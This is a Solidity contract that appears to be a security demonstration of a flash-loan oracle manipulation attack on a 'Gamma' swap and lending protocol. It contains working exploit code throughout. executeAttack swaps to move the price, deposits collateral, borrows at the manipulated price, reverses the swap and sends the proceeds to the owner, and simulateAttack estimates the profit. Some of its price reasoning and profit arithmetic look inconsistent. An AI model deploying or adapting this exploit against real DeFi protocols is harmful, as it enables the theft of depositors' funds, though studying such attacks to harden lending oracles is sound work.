// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./GammaSwap.sol";
import "./GammaOracle.sol";
import "./GammaLending.sol";

/**
 * @title FlashLoanAttacker
 * @notice Demonstrates flash loan oracle manipulation attack on Gamma protocol
 */
contract FlashLoanAttacker {
    GammaSwap public immutable gammaSwap;
    GammaOracle public immutable oracle;
    GammaLending public immutable lending;
    IERC20 public immutable gammaToken;
    
    address public owner;
    
    constructor(
        address _gammaSwap,
        address _oracle,
        address _lending,
        address _gammaToken
    ) {
        gammaSwap = GammaSwap(_gammaSwap);
        oracle = GammaOracle(_oracle);
        lending = GammaLending(payable(_lending));
        gammaToken = IERC20(_gammaToken);
        owner = msg.sender;
    }
    
    /**
     * @notice Execute flash loan oracle manipulation attack
     * @dev Attack flow:
     * 1. Record initial state
     * 2. Swap large amount of GAMMA for ETH (manipulate price down)
     * 3. Deposit small GAMMA as collateral
     * 4. Borrow maximum ETH (oracle shows low GAMMA price)
     * 5. Reverse swap (restore price)
     * 6. Keep profit
     */
    function executeAttack(uint256 gammaAmount) external payable {
        require(msg.sender == owner, "Not owner");
        
        // Step 1: Record initial state
        uint256 initialGammaBalance = gammaToken.balanceOf(address(this));
        uint256 initialETHBalance = address(this).balance;
        uint256 priceBeforeAttack = oracle.getPrice();
        
        // Step 2: Manipulate price DOWN by swapping GAMMA for ETH
        gammaToken.approve(address(gammaSwap), gammaAmount);
        uint256 ethReceived = gammaSwap.swapGammaForETH(gammaAmount);
        
        uint256 priceAfterManipulation = oracle.getPrice();
        
        // Step 3: Deposit small amount as collateral
        uint256 collateralAmount = gammaAmount / 100; // 1% of swap amount
        gammaToken.approve(address(lending), collateralAmount);
        lending.deposit(collateralAmount);
        
        // Step 4: Borrow maximum ETH at manipulated price
        // At manipulated low price, collateral appears more valuable
        uint256 maxBorrow = calculateMaxBorrow(collateralAmount, priceAfterManipulation);
        lending.borrow(maxBorrow);
        
        // Step 5: Reverse swap to restore price
        uint256 ethToSwapBack = ethReceived / 2; // Use half to restore price
        uint256 gammaRecovered = gammaSwap.swapETHForGamma{value: ethToSwapBack}();
        
        uint256 priceAfterReverse = oracle.getPrice();
        
        // Step 6: Calculate profit
        uint256 finalGammaBalance = gammaToken.balanceOf(address(this));
        uint256 finalETHBalance = address(this).balance;
        
        uint256 gammaProfit = finalGammaBalance > initialGammaBalance ? 
            finalGammaBalance - initialGammaBalance : 0;
        uint256 ethProfit = finalETHBalance > initialETHBalance ? 
            finalETHBalance - initialETHBalance : 0;
        
        // Transfer profits to owner
        if (gammaProfit > 0) {
            gammaToken.transfer(owner, gammaProfit);
        }
        if (ethProfit > 0) {
            (bool success,) = owner.call{value: ethProfit}("");
            require(success, "ETH transfer failed");
        }
    }
    
    /**
     * @notice Simulate attack without execution (for testing)
     */
    function simulateAttack(uint256 gammaAmount) external view returns (
        uint256 priceBeforeAttack,
        uint256 priceAfterManipulation,
        uint256 priceAfterReverse,
        uint256 estimatedProfit
    ) {
        priceBeforeAttack = oracle.getPrice();
        
        // Simulate price after swap
        (uint256 reserveGamma, uint256 reserveETH) = gammaSwap.getReserves();
        uint256 newReserveGamma = reserveGamma + gammaAmount;
        uint256 gammaInWithFee = gammaAmount * 997;
        uint256 ethOut = (gammaInWithFee * reserveETH) / (reserveGamma * 1000 + gammaInWithFee);
        uint256 newReserveETH = reserveETH - ethOut;
        
        priceAfterManipulation = (newReserveGamma * 1e18) / newReserveETH;
        
        // Calculate max borrow at manipulated price
        uint256 collateralAmount = gammaAmount / 100;
        uint256 maxBorrow = calculateMaxBorrow(collateralAmount, priceAfterManipulation);
        
        // Simulate reverse swap
        uint256 ethToSwapBack = ethOut / 2;
        uint256 ethInWithFee = ethToSwapBack * 997;
        uint256 gammaOut = (ethInWithFee * newReserveGamma) / (newReserveETH * 1000 + ethInWithFee);
        
        uint256 finalReserveGamma = newReserveGamma - gammaOut;
        uint256 finalReserveETH = newReserveETH + ethToSwapBack;
        priceAfterReverse = (finalReserveGamma * 1e18) / finalReserveETH;
        
        // Estimate profit
        estimatedProfit = maxBorrow - ethToSwapBack;
    }
    
    function calculateMaxBorrow(uint256 collateral, uint256 price) internal pure returns (uint256) {
        uint256 collateralValueInETH = (collateral * 1e18) / price;
        return (collateralValueInETH * 100) / 150; // 150% collateral ratio
    }
    
    receive() external payable {}
}